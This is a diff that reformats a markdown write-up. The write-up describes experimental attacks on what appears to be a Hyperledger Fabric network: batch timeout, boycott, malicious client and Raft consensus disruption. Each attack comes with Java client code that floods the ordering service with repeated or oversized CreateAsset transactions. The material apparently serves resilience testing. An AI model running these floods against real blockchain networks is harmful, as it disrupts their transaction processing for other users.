@@ -1,6 +1,3 @@
-<img src="./o2atv5vs.png"
-style="width:3.19792in;height:1.02083in" />
-
 **Attack** **Implementation** **Description**
 
 **Batch** **Timeout** **Attack**
@@ -31,20 +28,24 @@ application's terminal output for successful transaction confirmations,
 indicating the attack's effect on transaction processing time. You can
 see a sample Application output time in the image below.
 
-> Image 1: a sample terminal output
+<img src="./o2atv5vs.png"
+style="width:3.19792in;height:1.02083in" />
 
+
+```java
 private void createAsset(String assetId, String color, String size,
 String owner, String appraisedValue) throws EndorseException,
 SubmitException, CommitStatusException, CommitException {
 
-System.out.println("\n--\> Submit Transaction: CreateAsset"); for (int
-i=0; i\<1000; i++){
+    System.out.println("\n--> Submit Transaction: CreateAsset");
+    for (int i = 0; i < 1000; i++) {
 
-contract.submitTransaction("CreateAsset", String.valueOf(i),
-String.valueOf(i), String.valueOf(i), String.valueOf(i),
-String.valueOf(i));
+        contract.submitTransaction("CreateAsset", String.valueOf(i),
+        String.valueOf(i), String.valueOf(i), String.valueOf(i),
+        String.valueOf(i));
 
-System.out.println("\*\*\* Transaction committed successfully"); }
+        System.out.println("*** Transaction committed successfully");
+    }
 
 }
 
@@ -74,68 +75,54 @@ indicating transaction rejections and timeouts, confirming the block
 discard behavior. The used command was “docker logs -f \<orderer
 container_id_or_name\>”
 
+```java
 import java.util.Random;
 
-private void createAsset(String assetId, String color, String size,
-String owner, String appraisedValue, int maxPayloadSize, Contract
-contract)
+private void createAsset(String assetId, String color, String size, String owner, String appraisedValue, int maxPayloadSize, Contract contract)
+    throws EndorseException, SubmitException, CommitStatusException, CommitException {
+    System.out.println("\n--> Submit Transaction: CreateAsset");
+    Random random = new Random();
+    int payloadSize = random.nextInt(maxPayloadSize + 1);
+    String payload = generateRandomString(payloadSize);
+    int iterations = 100;
+    int authorizedOnes = 5;
+    int counter = 0;
 
-> throws EndorseException, SubmitException, CommitStatusException,
-> CommitException { System.out.println("\n--\> Submit Transaction:
-> CreateAsset");
->
-> Random random = new Random();
->
-> int payloadSize = random.nextInt(maxPayloadSize + 1); String payload =
-> generateRandomString(payloadSize);
->
-> int iterations = 100;
->
-> int authorizedOnes = 5; int counter = 0;
->
-> for (int i = 0; i \< iterations; i++) {
->
-> if (generateRandomBinary(authorizedOnes, iterations) == 1 && counter
-> \< authorizedOnes) { System.out.println("Submitting large payload
-> transaction, payloadSize: " + payloadSize);
-> contract.submitTransaction("CreateAsset", String.valueOf(i),
-> String.valueOf(i), String.valueOf(i),
-
-String.valueOf(i), payload); counter++;
-
-> } else {
->
-> System.out.println("Submitting small payload transaction");
-> contract.submitTransaction("CreateAsset", String.valueOf(i),
-> String.valueOf(i), String.valueOf(i),
-
-String.valueOf(i), String.valueOf(i));
-
-> } }
-
+    for (int i = 0; i < iterations; i++) {
+        if (generateRandomBinary(authorizedOnes, iterations) == 1 && counter < authorizedOnes) {
+            System.out.println("Submitting large payload transaction, payloadSize: " + payloadSize);
+            contract.submitTransaction("CreateAsset", String.valueOf(i), String.valueOf(i), String.valueOf(i),
+                String.valueOf(i), payload);
+            counter++;
+        } else {
+            System.out.println("Submitting small payload transaction");
+            contract.submitTransaction("CreateAsset", String.valueOf(i), String.valueOf(i), String.valueOf(i),
+                String.valueOf(i), String.valueOf(i));
+        }
+    }
 }
 
 private String generateRandomString(int length) {
+    String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    StringBuilder result = new StringBuilder(length);
+    Random random = new Random();
 
-> String characters =
-> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-> StringBuilder result = new StringBuilder(length);
->
-> Random random = new Random(); for (int i = 0; i \< length; i++) {
->
-> result.append(characters.charAt(random.nextInt(characters.length())));
-> }
+    for (int i = 0; i < length; i++) {
+        result.append(characters.charAt(random.nextInt(characters.length())));
+    }
 
-return result.toString(); }
+    return result.toString();
+}
 
 private int generateRandomBinary(int authorizedOnes, int totalReps) {
-Random random = new Random();
+    Random random = new Random();
 
-> if (random.nextInt(totalReps) \< authorizedOnes) { return 1;
->
-> } else { return 0;
-
-} }
+    if (random.nextInt(totalReps) < authorizedOnes) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
 
 **Bycott** **Attack**
 
@@ -189,66 +176,51 @@ a failure of the ordering service to commit blocks.
 
 import java.util.Random;
 
-private void createAsset(String assetId, String color, String size,
-String owner, String appraisedValue, int maxPayloadSize, Contract
-contract)
+private void createAsset(String assetId, String color, String size, String owner, String appraisedValue, int maxPayloadSize, Contract contract)
+    throws EndorseException, SubmitException, CommitStatusException, CommitException {
+    System.out.println("\n--> Submit Transaction: CreateAsset");
+    Random random = new Random();
+    int payloadSize = random.nextInt(maxPayloadSize + 1);
+    String payload = generateRandomString(payloadSize);
+    int iterations = 100;
+    int authorizedOnes = 5;
+    int counter = 0;
 
-> throws EndorseException, SubmitException, CommitStatusException,
-> CommitException { System.out.println("\n--\> Submit Transaction:
-> CreateAsset");
->
-> Random random = new Random();
->
-> int payloadSize = random.nextInt(maxPayloadSize + 1); String payload =
-> generateRandomString(payloadSize);
->
-> int iterations = 100;
->
-> int authorizedOnes = 5; int counter = 0;
->
-> for (int i = 0; i \< iterations; i++) {
->
-> if (generateRandomBinary(authorizedOnes, iterations) == 1 && counter
-> \< authorizedOnes) { System.out.println("Submitting large payload
-> transaction, payloadSize: " + payloadSize);
-> contract.submitTransaction("CreateAsset", String.valueOf(i),
-> String.valueOf(i), String.valueOf(i),
-
-String.valueOf(i), payload); counter++;
-
-> } else {
->
-> System.out.println("Submitting small payload transaction");
-> contract.submitTransaction("CreateAsset", String.valueOf(i),
-> String.valueOf(i), String.valueOf(i),
-
-String.valueOf(i), String.valueOf(i)); }
-
-} }
+    for (int i = 0; i < iterations; i++) {
+        if (generateRandomBinary(authorizedOnes, iterations) == 1 && counter < authorizedOnes) {
+            System.out.println("Submitting large payload transaction, payloadSize: " + payloadSize);
+            contract.submitTransaction("CreateAsset", String.valueOf(i), String.valueOf(i), String.valueOf(i),
+                String.valueOf(i), payload);
+            counter++;
+        } else {
+            System.out.println("Submitting small payload transaction");
+            contract.submitTransaction("CreateAsset", String.valueOf(i), String.valueOf(i), String.valueOf(i),
+                String.valueOf(i), String.valueOf(i));
+        }
+    }
+}
 
 private String generateRandomString(int length) {
+    String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    StringBuilder result = new StringBuilder(length);
+    Random random = new Random();
 
-> String characters =
-> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-> StringBuilder result = new StringBuilder(length);
->
-> Random random = new Random();
->
-> for (int i = 0; i \< length; i++) {
-> result.append(characters.charAt(random.nextInt(characters.length())));
->
-> }
+    for (int i = 0; i < length; i++) {
+        result.append(characters.charAt(random.nextInt(characters.length())));
+    }
 
-return result.toString(); }
+    return result.toString();
+}
 
 private int generateRandomBinary(int authorizedOnes, int totalReps) {
-Random random = new Random();
+    Random random = new Random();
 
-> if (random.nextInt(totalReps) \< authorizedOnes) { return 1;
->
-> } else { return 0;
-
-} }
+    if (random.nextInt(totalReps) < authorizedOnes) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
 
 **Malicious** **Client** **Attack**
 
@@ -279,44 +251,32 @@ service.
 
 import java.util.Random;
 
-private void createAsset(String assetId, String color, String size,
-String owner, String appraisedValue, int maxPayloadSize, Contract
-contract)
+private void createAsset(String assetId, String color, String size, String owner, String appraisedValue, int maxPayloadSize, Contract contract)
+    throws EndorseException, SubmitException, CommitStatusException, CommitException {
+    System.out.println("\n--> Submit Transaction: CreateAsset");
+    Random random = new Random();
+    int payloadSize = random.nextInt(maxPayloadSize - 1); // Using maxPayloadSize parameter
+    String payload = generateRandomString(payloadSize);
+    int iterations = 1000;
 
-> throws EndorseException, SubmitException, CommitStatusException,
-> CommitException { System.out.println("\n--\> Submit Transaction:
-> CreateAsset");
->
-> Random random = new Random();
->
-> int payloadSize = random.nextInt(maxPayloadSize - 1); // Using
-> maxPayloadSize parameter String payload =
-> generateRandomString(payloadSize);
->
-> int iterations = 1000;
->
-> for (int i = 0; i \< iterations; i++) {
->
-> System.out.println("Submitting large payload transaction, payloadSize:
-> " + payloadSize); contract.submitTransaction("CreateAsset",
-> String.valueOf(i), String.valueOf(i), String.valueOf(i),
-
-String.valueOf(i), payload); }
-
+    for (int i = 0; i < iterations; i++) {
+        System.out.println("Submitting large payload transaction, payloadSize: " + payloadSize);
+        contract.submitTransaction("CreateAsset", String.valueOf(i), String.valueOf(i), String.valueOf(i),
+            String.valueOf(i), payload);
+    }
 }
 
 private String generateRandomString(int length) {
+    String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    StringBuilder result = new StringBuilder(length);
+    Random random = new Random();
 
-> String characters =
-> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-> StringBuilder result = new StringBuilder(length);
->
-> Random random = new Random(); for (int i = 0; i \< length; i++) {
->
-> result.append(characters.charAt(random.nextInt(characters.length())));
-> }
+    for (int i = 0; i < length; i++) {
+        result.append(characters.charAt(random.nextInt(characters.length())));
+    }
 
-return result.toString(); }
+    return result.toString();
+}
 
 **Raft** **Consensus** **Protocol** **attack**
 
@@ -343,17 +303,12 @@ increased transaction latency, indicated a successful disruption of the
 Raft consensus protocol. The application code has some changes in the
 createAsset function.
 
-private void createAsset(String assetId, String color, String size,
-String owner, String appraisedValue) throws EndorseException,
-SubmitException, CommitStatusException, CommitException {
-
-System.out.println("\n--\> Submit Transaction: CreateAsset"); for (int
-i=0; i\<1000; i++){
-
-contract.submitTransaction("CreateAsset", String.valueOf(i),
-String.valueOf(i), String.valueOf(i), String.valueOf(i),
-String.valueOf(i));
-
-System.out.println("\*\*\* Transaction committed successfully"); }
-
+private void createAsset(String assetId, String color, String size, String owner, String appraisedValue)
+    throws EndorseException, SubmitException, CommitStatusException, CommitException {
+    System.out.println("\n--> Submit Transaction: CreateAsset");
+    for (int i = 0; i < 1000; i++) {
+        contract.submitTransaction("CreateAsset", String.valueOf(i), String.valueOf(i), String.valueOf(i),
+            String.valueOf(i), String.valueOf(i));
+        System.out.println("*** Transaction committed successfully");
+    }
 }
